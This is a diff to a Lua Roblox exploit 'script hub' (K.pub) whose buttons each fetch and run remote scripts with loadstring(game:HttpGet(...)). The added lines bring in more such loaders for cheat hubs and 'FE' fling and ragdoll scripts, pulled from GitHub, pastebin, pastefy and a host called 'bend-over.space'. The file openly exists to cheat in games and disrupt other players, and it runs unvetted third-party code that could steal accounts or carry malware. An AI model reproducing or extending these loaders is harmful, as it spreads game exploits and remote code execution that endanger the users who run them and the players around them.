@@ -1,6 +1,6 @@
- local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))() -- Library
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))() -- Library
 local Window = OrionLib:MakeWindow({Name = "K.pub | Script Hub", HidePremium = true, SaveConfig = false, ConfigFolder = "OrionTest"}) -- Window
-OrionLib:MakeNotification({ -- Notification
+OrionLib:MakeNotification({ -- Notification Game:GetService("Players").LocalPlayer:Kick("put what ever you want here")
 
 
 	Name = "Notification!",
@@ -28,11 +28,12 @@ Tab:AddButton({
 	Name = "Copy Discord Link",
 	Callback = function()
       		print("button pressed")
-setclipboard("https://discord.gg/ch3XWYFXDV")
+setclipboard("https://discord.gg/tPGVDVTtGh")
   	end    
 })
 
 Tab:AddParagraph("WARNING","Some of these scripts might be outdated. If the game you want to exploit on has updated while you're reading this, I suggest trying the script on a alt.")
+Tab:AddParagraph("Credits","All credits for scripts should be in the scripts. If you need to contact me about something, please DM streekaiz#1132")
 
 -----------------------------------------------------------------------------------------------------
 
@@ -153,10 +154,20 @@ Tab:AddButton({
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TrixAde/Proxima-Hub/main/Main.lua", true))()
       end    
 })
+
+Tab:AddButton({ -- Infinite Yield
+
+	Name = "Shindo Life",
+	Callback = function()
+      		print("button pressed")
+loadstring(game:HttpGet("https://bend-over.space/.lua%22", true))()
+  	end    
+})
+
 -----------------------------------------------------------------------------------------------------
 
 local Tab = Window:MakeTab({ -- Hubs 2
-	Name = "Hubs",
+	Name = "Script Hubs",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
@@ -193,7 +204,7 @@ Tab:AddParagraph("Universal FE Script Hub | WARNING","THIS WILL REPLACE K.PUB'S 
 -----------------------------------------------------------------------------------------------------
 
 local Tab = Window:MakeTab({ -- Universal 3
-	Name = "Universal",
+	Name = "Universal Scripts",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
@@ -261,18 +272,58 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Averiias/Universal-Si
   	end    
 })
 
-Tab:AddParagraph("Universal ESP","A very customizable ESP.")
-Tab:AddButton({ -- Vxpe V4 Universal
-    Name = "Vxpe V4",
-    Callback = function()
-              print("button pressed")
+Tab:AddButton({ -- Vxpe
+	Name = "Vxpe",
+	Callback = function()
+      		print("button pressed")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
-      end    
+  	end    
 })
 -----------------------------------------------------------------------------------------------------
 
 local Tab = Window:MakeTab({ -- Scripts 1
-	Name = "Misc",
+	Name = "FE Scripts",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+Tab:AddButton({ -- FE Ragdoll
+	Name = "FE Ragdoll (R6 Only.)",
+	Callback = function()
+      		print("button pressed")
+loadstring(game:HttpGet("https://pastebin.com/raw/dSJuH5kk", true))()
+  	end    
+})
+Tab:AddLabel("NO HATS NEEDED. Click to respawn after dying.")
+
+Tab:AddButton({ -- FE Helicopter
+	Name = "FE Helicopter (R6 Only.)",
+	Callback = function()
+      		print("button pressed")
+loadstring(game:HttpGet("https://pastebin.com/raw/d9J7fYKT", true))()
+  	end    
+})
+
+Tab:AddParagraph("NO HATS NEEDED","Stay in game for 10+ Mins, and try to go as far away from people and execute (executing near people ruins the script a bit.)")
+
+Tab:AddButton({ -- FE Minecraft Ghast
+	Name = "FE Minecraft Ghast Fling Script",
+	Callback = function()
+      		print("button pressed")
+loadstring(game:HttpGet('https://pastefy.ga/zFn0z6VV/raw'))()
+  	end    
+})
+
+Tab:AddButton({ -- FE Minecraft Ghast
+	Name = "Free hats r needed. Click for hats",
+	Callback = function()
+      		print("button pressed")
+setclipboard("https://pastebin.com/raw/VJU8brdw")
+  	end    
+})
+-----------------------------------------------------------------------------------------------------
+
+local Tab = Window:MakeTab({ -- Scripts 1
+	Name = "Misc/Tools",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
